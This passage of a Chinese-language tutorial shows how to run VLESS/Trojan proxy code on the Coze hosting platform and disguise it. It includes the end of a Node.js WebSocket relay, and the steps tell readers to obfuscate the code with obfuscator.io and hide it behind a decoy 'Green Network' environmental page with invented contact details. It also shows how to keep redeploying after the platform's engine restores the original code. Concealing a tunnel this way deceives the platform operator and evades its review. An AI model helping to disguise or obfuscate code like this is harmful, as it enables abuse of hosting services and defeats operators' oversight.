net.connect({ host, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } // Tro-jan处理 function handleTrojanConnection(ws, msg) { try { if (msg.length \u0026lt; 58) return false; const receivedPasswordHash = msg.slice(0, 56).toString(); const possiblePasswords = [ UUID, ]; let matchedPassword = null; for (const pwd of possiblePasswords) { const hash = crypto.createHash(\u0026#39;sha224\u0026#39;).update(pwd).digest(\u0026#39;hex\u0026#39;); if (hash === receivedPasswordHash) { matchedPassword = pwd; break; } } if (!matchedPassword) return false; let offset = 56; if (msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const cmd = msg[offset]; if (cmd !== 0x01) return false; offset += 1; const atyp = msg[offset]; offset += 1; let host, port; if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(\u0026#39;.\u0026#39;); offset += 4; } else if (atyp === 0x03) { const hostLen = msg[offset]; offset += 1; host = msg.slice(offset, offset + hostLen).toString(); offset += hostLen; } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;); offset += 16; } else { return false; } port = msg.readUInt16BE(offset); offset += 2; if (offset \u0026lt; msg.length \u0026amp;\u0026amp; msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { net.connect({ host, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } catch (error) { return false; } } // Ws 连接处理 wss.on(\u0026#39;connection\u0026#39;, (ws, req) =\u0026gt; { const url = req.url || \u0026#39;\u0026#39;; ws.once(\u0026#39;message\u0026#39;, msg =\u0026gt; { if (msg.length \u0026gt; 17 \u0026amp;\u0026amp; msg[0] === 0) { const id = msg.slice(1, 17); const isVless = id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16)); if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); } return; } } if (!handleTrojanConnection(ws, msg)) { ws.close(); } }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); httpServer.listen(PORT, () =\u0026gt; { const scheme = tlsOptions ? \u0026#39;HTTPS/WSS\u0026#39; : \u0026#39;HTTP/WS\u0026#39;; console.log(`Server is running on ${scheme} port ${PORT}`); }); 原始文件长这样：\n把原有内容都删除了注意先别贴，需要修改和混淆\n我们要改的有几个地方：\nconst DOMAIN = process.env.DOMAIN || \u0026#39;xxxx.coze.site\u0026#39;; // 填写项目域名 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 获取节点的订阅路径 const PORT = process.env.PORT || 5000; // http和ws服务端口 注意index.js程序，跟上两篇不一样，wispbyte和CF都在国外，所以dns的部分是直接访问谷歌dns，而扣子是在国内，dns的部分就不能访问谷歌了，否则程序会失效，注意注意\n然后还是到 https://obfuscator.io/legacy-playground\n把代码贴入混淆\n然后替换掉 index.html 换上我们经典的环保地球，依然是大家最好让 gemini 给重新生成一个，否则哈哈哈，遍天下都是这个环保，真的无语了\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Green Network - Protect Earth\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; * { margin: 0; padding: 0; box-sizing: border-box; font-family: \u0026#39;Segoe UI\u0026#39;, Tahoma, Geneva, Verdana, sans-serif; } :root { --primary: #2e7d32; --secondary: #4caf50; --accent: #8bc34a; --light: #e8f5e9; --dark: #1b5e20; --text: #333333; --white: #ffffff; } body { background-color: var(--light); color: var(--text); line-height: 1.7; /* Slightly increased line height for readability */ font-size: 16px; } header { background: rgba(46, 125, 50, 0.95); /* Slightly transparent primary color */ color: var(--white); padding: 1rem 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .container { width: 90%; max-width: 1200px; margin: 0 auto; } .nav-container { display: flex; justify-content: space-between; align-items: center; } .logo { display: flex; align-items: center; gap: 10px; font-size: 1.8rem; font-weight: 700; } .logo i { font-size: 2rem; } nav ul { display: flex; list-style: none; } nav ul li { margin-left: 2rem; } nav ul li a { color: var(--white); text-decoration: none; font-weight: 500; transition: all 0.3s ease; padding: 0.5rem 0; position: relative; } nav ul li a:hover { color: var(--accent); } nav ul li a::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: var(--accent); transition: width 0.3s ease; } nav ul li a:hover::after { width: 100%; } .hero { background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.4)), url(\u0026#39;https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2073\u0026amp;q=80\u0026#39;); background-size: cover; background-position: center; height: 80vh; display: flex; align-items: center; text-align: center; color: var(--white); } .hero-content { max-width: 800px; margin: 0 auto; } .hero h1 { font-size: 3.5rem; margin-bottom: 1rem; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); } .hero p { font-size: 1.3rem; margin-bottom: 2rem; } .btn { display: inline-block; background-color: var(--accent); color: var(--white); padding: 0.9rem 2.2rem; /* Slightly larger padding */ border-radius: 8px; /* More modern rounded corners */ text-decoration: none; font-weight: 600; transition: all 0.3s ease; border: none; cursor: pointer; box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); /* Slightly enhanced shadow */ } .btn:hover { background-color: var(--primary); transform: translateY(-5px); /* More pronounced lift effect */ box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2); /* Stronger hover shadow */ } section { padding: 5rem 0; } .section-title { text-align: center; margin-bottom: 3rem; } .section-title h2 { font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem; position: relative; display: inline-block; } .section-title h2::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 90px; /* Slightly wider underline */ height: 5px; /* Thicker underline */ background-color: var(--accent); border-radius: 3px; } .section-title p { color: var(--text); max-width: 700px; margin: 0 auto; font-size: 1.1rem; } .about-content { display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; align-items: center; } .about-img { border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 12px 25px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .about-img img { width: 100%; height: auto; display: block; transition: transform 0.5s ease; } .about-img:hover img { transform: scale(1.08); /* More pronounced zoom */ } .about-text h3 { font-size: 2rem; margin-bottom: 1.5rem; color: var(--dark); } .about-text p { margin-bottom: 1.5rem; font-size: 1.05rem; } .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2rem; margin-top: 4rem; /* More space */ } .stat-item { text-align: center; padding: 2.5rem 1.5rem; /* More padding */ background-color: var(--white); border-radius: 12px; /* More rounded */ box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .stat-item:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .stat-item h3 { font-size: 3rem; /* Larger numbers */ color: var(--dark); margin-bottom: 0.8rem; } .stat-item p { color: var(--text); font-size: 1.1rem; } .initiatives { background-color: var(--white); } .initiatives-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2.5rem; } .initiative-card { background-color: var(--light); border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .initiative-card:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .initiative-img { height: 220px; /* Slightly taller images */ overflow: hidden; } .initiative-img img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.5s ease; } .initiative-card:hover .initiative-img img { transform: scale(1.15); /* More pronounced zoom */ } .initiative-content { padding: 2rem; } .initiative-content h3 { font-size: 1.6rem; margin-bottom: 1rem; color: var(--dark); } .initiative-content p { margin-bottom: 1.8rem; font-size: 1.05rem; } .cta { background: linear-gradient(to right, var(--primary), var(--secondary)); color: var(--white); text-align: center; padding: 6rem 0; /* More padding */ } .cta h2 { font-size: 3rem; /* Larger heading */ margin-bottom: 1.8rem; } .cta p { font-size: 1.3rem; margin-bottom: 2.5rem; max-width: 700px; margin-left: auto; margin-right: auto; } .cta .btn { background-color: var(--white); color: var(--primary); } .cta .btn:hover { background-color: var(--accent); color: var(--white); } footer { background-color: var(--dark); color: var(--white); padding: 4rem 0 2rem; /* More padding */ } .footer-content { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2.5rem; /* More gap */ margin-bottom: 2.5rem; } .footer-column h3 { font-size: 1.4rem; margin-bottom: 1.8rem; position: relative; padding-bottom: 12px; } .footer-column h3::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 50px; /* Wider underline */ height: 3px; /* Thicker underline */ background-color: var(--accent); } .footer-column p { margin-bottom: 1.2rem; } .footer-links { list-style: none; } .footer-links li { margin-bottom: 1rem; } .footer-links li a { color: var(--light); text-decoration: none; transition: all 0.3s ease; } .footer-links li a:hover { color: var(--accent); padding-left: 8px; /* More pronounced slide effect */ } .social-links { display: flex; gap: 1.2rem; margin-top: 1.5rem; } .social-links a { display: inline-flex; align-items: center; justify-content: center; width: 50px; /* Larger social buttons */ height: 50px; background-color: rgba(255, 255, 255, 0.15); /* Slightly more visible background */ border-radius: 8px; /* Square with rounded corners */ color: var(--white); text-decoration: none; font-weight: 600; transition: all 0.3s ease; font-size: 0.9rem; } .social-links a:hover { background-color: var(--accent); transform: translateY(-7px); /* More pronounced lift */ } .copyright { text-align: center; padding-top: 2.5rem; border-top: 1px solid rgba(255, 255, 255, 0.15); } .mobile-menu { display: none; font-size: 1.5rem; cursor: pointer; padding: 0.5rem 1rem; border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 5px; transition: all 0.3s ease; } .mobile-menu:hover { background-color: rgba(255, 255, 255, 0.1); } @media (max-width: 992px) { .about-content { grid-template-columns: 1fr; } .initiatives-grid { grid-template-columns: repeat(2, 1fr); } .footer-content { grid-template-columns: repeat(2, 1fr); } .stats { grid-template-columns: repeat(2, 1fr); } } @media (max-width: 768px) { .hero h1 { font-size: 2.8rem; /* Adjusted for better readability on smaller screens */ } .hero p { font-size: 1.2rem; /* Adjusted for better readability on smaller screens */ } nav ul { display: none; position: absolute; top: 100%; left: 0; width: 100%; background-color: var(--primary); flex-direction: column; padding: 1rem 0; text-align: center; box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1); } nav ul.active { display: flex; } nav ul li { margin: 0; padding: 0.8rem 0; } .mobile-menu { display: block; font-size: 1.2rem; /* Slightly smaller for mobile */ padding: 0.4rem 0.8rem; } .initiatives-grid { grid-template-columns: 1fr; } .footer-content { grid-template-columns: 1fr; } .stats { grid-template-columns: 1fr; } .social-links a { width: 45px; /* Slightly smaller social buttons */ height: 45px; font-size: 0.85rem; } } /* Animation for stats counter */ .counter { transition: all 0.5s ease; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- Header --\u0026gt; \u0026lt;header\u0026gt; \u0026lt;div class=\u0026#34;container nav-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span\u0026gt;Green Network\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;div class=\u0026#34;mobile-menu\u0026#34;\u0026gt; Menu \u0026lt;/div\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;!-- Hero Section --\u0026gt; \u0026lt;section class=\u0026#34;hero\u0026#34; id=\u0026#34;home\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container hero-content\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Protect Our Planet, Preserve Our Future\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Join the global movement to create a sustainable world through conservation, education, and community action.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#get-involved\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Join Our Network\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- About Section --\u0026gt; \u0026lt;section id=\u0026#34;about\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;About Green Network\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;We are a global community dedicated to environmental protection and sustainable development.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;about-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1507591064344-4c6ce005b128?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2070\u0026amp;q=80\u0026#34; alt=\u0026#34;Team planting trees\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-text\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Mission\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Green Network is committed to creating a sustainable future by protecting natural ecosystems, promoting renewable energy, and empowering communities to take environmental action.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Founded in 2010, we\u0026#39;ve grown from a small grassroots organization to an international network with over 50,000 members across 120 countries.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Our approach combines scientific research, community engagement, and policy advocacy to address the most pressing environmental challenges of our time.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;2500000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Trees Planted\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;50000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Active Members\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;120\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Countries Reached\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;1500\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Cleanup Projects\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Initiatives Section --\u0026gt; \u0026lt;section class=\u0026#34;initiatives\u0026#34; id=\u0026#34;initiatives\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Our Initiatives\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Discover the key programs and projects we\u0026#39;re implementing to protect our planet.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiatives-grid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://dialogue.earth/content/uploads/2021/04/lessons-from-the-rush-to-reforest-china-dialogue-2400x1599.jpg\u0026#34; alt=\u0026#34;Reforestation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Global Reforestation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Planting millions of trees worldwide to restore ecosystems, combat climate change, and protect biodiversity.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1621451537084-482c73073a0f?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=1974\u0026amp;q=80\u0026#34; alt=\u0026#34;Ocean Conservation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Ocean Conservation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Protecting marine ecosystems, reducing plastic pollution, and promoting sustainable fishing practices.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2072\u0026amp;q=80\u0026#34; alt=\u0026#34;Renewable Energy\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Renewable Energy\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Promoting solar, wind, and other clean energy sources to reduce dependence on fossil fuels.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- CTA Section --\u0026gt; \u0026lt;section class=\u0026#34;cta\u0026#34; id=\u0026#34;get-involved\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Join Our Global Movement\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Together, we can create a sustainable future for generations to come. Every action counts, no matter how small.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Become a Member\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Footer --\u0026gt; \u0026lt;footer id=\u0026#34;contact\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Green Network\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;We are dedicated to protecting our planet through collaborative action, education, and sustainable solutions.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;social-links\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Facebook\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Twitter\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Instagram\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;LinkedIn\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Quick Links\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Programs\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Reforestation\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Ocean Cleanup\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Wildlife Protection\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Climate Education\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Sustainable Agriculture\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Contact Us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Copper Creek Drive, New York\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;+1 (312) 171-0771\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;support@greennetwork.org\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026amp;copy; 2025 Green Network. All rights reserved.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;script\u0026gt; // Mobile Menu Toggle document.querySelector(\u0026#39;.mobile-menu\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, function() { document.querySelector(\u0026#39;nav ul\u0026#39;).classList.toggle(\u0026#39;active\u0026#39;); }); // Counter Animation function animateCounters() { const counters = document.querySelectorAll(\u0026#39;.counter\u0026#39;); const speed = 200; // The lower the slower counters.forEach(counter =\u0026gt; { const target = +counter.getAttribute(\u0026#39;data-target\u0026#39;); const count = +counter.innerText; const inc = target / speed; if(count \u0026lt; target) { counter.innerText = Math.ceil(count + inc); setTimeout(animateCounters, 1); } else { counter.innerText = target; } }); } // Initialize counters when page loads window.addEventListener(\u0026#39;load\u0026#39;, animateCounters); // Smooth scrolling for navigation links document.querySelectorAll(\u0026#39;a[href^=\u0026#34;#\u0026#34;]\u0026#39;).forEach(anchor =\u0026gt; { anchor.addEventListener(\u0026#39;click\u0026#39;, function(e) { e.preventDefault(); const targetId = this.getAttribute(\u0026#39;href\u0026#39;); if(targetId === \u0026#39;#\u0026#39;) return; const targetElement = document.querySelector(targetId); if(targetElement) { window.scrollTo({ top: targetElement.offsetTop - 80, behavior: \u0026#39;smooth\u0026#39; }); document.querySelector(\u0026#39;nav ul\u0026#39;).classList.remove(\u0026#39;active\u0026#39;); } }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 一切完工，再点击部署，居然失败，那是当然的！因为我们加了axios和ws库，但是没下载，不要惊慌，一键修复\n然后左边栏开始滚动，这个智能引擎是可以分析出index.js的原始代码的\n得，它居然给还原了，还完全去掉了next框架，哈哈哈哈，那我们先退回去，如果不退，不会刷新文件列表\n然后重新进入，我们得二次重新修改 index.js 和 index.html，并且把正确的package.json给放进去\n{ \u0026#34;name\u0026#34;: \u0026#34;js01\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.0.3\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Nodejs-server\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;private\u0026#34;: false, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node index.js\u0026#34; }, \u0026#34;dependencies\u0026#34;: { \u0026#34;ws\u0026#34;: \u0026#34;^8.14.2\u0026#34;, \u0026#34;axios\u0026#34;: \u0026#34;^1.12.2\u0026#34; }, \u0026#34;engines\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;\u0026gt;=14\u0026#34; } } 检查一下3个文件内容是否正确，不行就退出去，再进来，它这个控制台得文件列表才会刷新\n注意上面的情况，可能会反复，我们确保三个文件都ok，失败就让让它自己修复，然后再在修复的基础上再改。\n最后重新部署一遍\n再打开页面，熟悉的环保页面又回来了\n然后打开订阅地址： 